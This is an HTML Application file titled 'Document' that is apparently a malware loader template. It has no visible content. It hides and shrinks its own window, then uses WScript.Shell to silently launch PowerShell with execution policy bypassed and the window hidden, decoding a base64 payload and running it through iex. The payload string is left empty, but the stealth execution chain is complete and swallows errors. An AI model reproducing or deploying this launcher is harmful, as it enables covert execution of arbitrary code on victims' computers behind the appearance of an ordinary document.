<html>
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
<meta charset="utf-8"/>
<title>Document</title>
<HTA:APPLICATION ID="a" APPLICATIONNAME="Document" BORDER="none" CAPTION="no" SHOWINTASKBAR="no" SCROLL="no" SINGLEINSTANCE="yes" WINDOWSTATE="minimize"/>
<script language="JScript">
window.resizeTo(0,0);
window.moveTo(-32000,-32000);
try {
  var sh=new ActiveXObject("WScript.Shell");
  var p="";
  var cmd='powershell -NoP -EP Bypass -W Hidden -C "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(\''+p+'\'))|iex"';
  sh.Run(cmd,0,false);
} catch(e) {}
try { window.close(); } catch(e) {}
</script>
</head>
<body></body>
</html>
